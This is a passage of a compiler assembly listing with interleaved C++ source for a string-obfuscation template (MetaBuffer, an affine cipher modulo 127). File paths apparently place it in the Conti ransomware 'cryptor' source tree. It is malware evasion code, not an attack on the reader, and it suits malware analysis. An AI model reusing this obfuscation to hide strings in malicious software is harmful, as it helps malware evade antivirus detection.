  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 25	 imul	 eax, eax, 37		; 00000025H
  0002d	83 c0 5a	 add	 eax, 90			; 0000005aH
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0e	 cmp	 QWORD PTR i$1[rbp], 14
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ PROC ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv196 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@AEBAEE@Z ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00281	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  00285	88 85 c0 00 00
	00		 mov	 BYTE PTR tv196[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  0028b	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00292	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00299	5f		 pop	 rdi
  0029a	5d		 pop	 rbp
  0029b	c3		 ret	 0
??0?$MetaBuffer@$0CF@$0FK@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >::MetaBuffer<37,90,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 35	 sub	 eax, 53			; 00000035H
  0002d	6b c0 dc	 imul	 eax, eax, -36		; ffffffffffffffdcH
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z PROC ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 43	 imul	 eax, eax, 67		; 00000043H
  0002d	83 c0 35	 add	 eax, 53			; 00000035H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@AEBAEE@Z ENDP ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0ED@$0DF@U?$integer_sequence@_K$0A@$00$01$02$03@std@@@@QEBA_NXZ ; MetaBuffer<67,53,std::integer_sequence<unsigned __int64,0,1,2,3,4> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 05	 cmp	 QWORD PTR i$1[rbp], 5
  0004c	73 37		 jae	 SHORT $LN3@decrypt

